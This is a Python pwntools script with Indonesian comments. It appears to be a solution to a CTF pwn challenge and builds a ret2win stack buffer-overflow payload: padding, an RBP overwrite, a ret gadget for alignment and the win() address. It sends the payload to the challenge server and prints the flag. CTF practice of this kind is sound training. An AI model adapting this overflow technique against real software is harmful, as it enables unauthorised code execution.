
from pwn import *

# Konteks binary 64-bit
context.arch = 'amd64'

# --- Alamat yang dibutuhkan ---
WIN_ADDRESS = 0x401187
# Ganti alamat ini dengan hasil dari ROPgadget
RET_GADGET_ADDRESS = 0x40101a

# Sambungkan ke server
p = remote('ctf.compfest.id', 7004)
# p = process('./chall') # Untuk testing lokal

# --- Payload Baru dengan Stack Alignment ---
payload = b''
payload += b'A' * 16                 # Padding (16 byte)
payload += b'B' * 8                   # Overwrite RBP (8 byte)
payload += p64(RET_GADGET_ADDRESS)   # Align stack dengan ret gadget
payload += p64(WIN_ADDRESS)          # Alamat win()
print(payload)

# Kirim payload
p.recvuntil(b'>> ')
log.info("Mengirim payload...")
p.sendline(payload)
log.success("Payload terkirim!")

# Terima dan cetak flag
try:
    flag = p.recvall(timeout=2)
    log.success(f"Flag: {flag.decode().strip()}")
except EOFError:
    log.warning("Koneksi ditutup.")